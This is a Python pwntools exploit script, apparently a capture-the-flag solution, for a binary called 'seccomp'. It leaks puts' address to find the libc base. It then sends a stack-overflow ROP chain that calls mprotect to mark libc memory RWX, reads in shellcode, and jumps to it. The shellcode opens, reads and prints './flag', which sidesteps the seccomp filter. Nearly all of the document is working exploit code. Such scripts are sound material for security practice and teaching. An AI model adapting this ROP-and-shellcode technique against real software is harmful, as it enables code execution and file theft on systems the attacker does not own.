from pwn import *
context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

if (DEBUG):
	context.log_level = "debug"

g_fname = "./seccomp"
g_elf = ELF(g_fname)
# The version of libc orignially used is 2.27
g_libcname = "libc.so.6"

if (LOCAL):
	g_io = process(g_fname)
	g_libc = g_elf.libc
else:
	g_io = remote("127.0.0.1", 8888)
	g_libc = ELF(g_libcname)

s, sa, sla = g_io.send, g_io.sendafter, g_io.sendlineafter

def getpid():
	if (LOCAL & DEBUG):
		log.info("pid: %d", g_io.proc.pid)
		pause()

def opt(idx):
	sa("Your choice:", str(idx))

def leak_puts_addr():
	opt(4)
	sa(">>> ", "Xiaohei!")
	g_io.recvuntil("That's what you want, right?\n")
	addr_hex = g_io.recvline()[:-1]
	log.info("received data=%s", addr_hex)
	addr_puts = int(addr_hex, 16)
	log.info("puts' address = %#x", addr_puts)
	return addr_puts

def pwn():
	addr_puts = leak_puts_addr()
	libc_base = addr_puts - g_libc.symbols["puts"]
	g_libc.address = libc_base
	addr_shellcode = libc_base + 0x3ec000 # write to the last 0x1000 bytes of libc-2.27.so
	addr_mprot = g_libc.symbols["mprotect"]
	addr_read = g_libc.symbols["read"]
	log.success("puts@%#x\nlibc@%#x", addr_puts, libc_base)
	
	# rop chain:
	#	mprotect(void* addr, size_t size, int prot): make addr_shellcode RWX
	#	read(0, shell_addr, len(shell_code)): read shell code to addr_shellcode	
	#	ret2shellcode
	
	# pop rdi; ret
	pop_rdi = libc_base + 0x00000000000215bf
	# pop rsi; ret
	pop_rsi = libc_base + 0x0000000000023eea
	# pop rdx; ret
	pop_rdx = libc_base + 0x0000000000001b96

	shell_code = shellcraft.open("./flag")
	shell_code += shellcraft.read("rax", "rsp", 0x100)
	shell_code += shellcraft.write(1, "rsp", 0x100)
	shell_code = asm(shell_code)

	padding = (0x40+8) * 'a'
	payload = flat([
		padding, 
		# mprotect(shell_addr, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
		pop_rdi, addr_shellcode,
		pop_rsi, 0x1000,
		pop_rdx, 7,		# PROT_READ = 1|PROT_WRITE = 2|PROT_EXEC = 4
		addr_mprot,
		# read(0, addr_shellcode, len(shell_code)
		pop_rdi, 0, 
		pop_rsi, addr_shellcode,
		pop_rdx, len(shell_code),
		addr_read,
		addr_shellcode
	])

	#getpid()
	opt(666)
	s(payload)

	sleep(1)
	s(shell_code)
	
if ("__main__" == __name__):
	pwn()
	g_io.interactive()
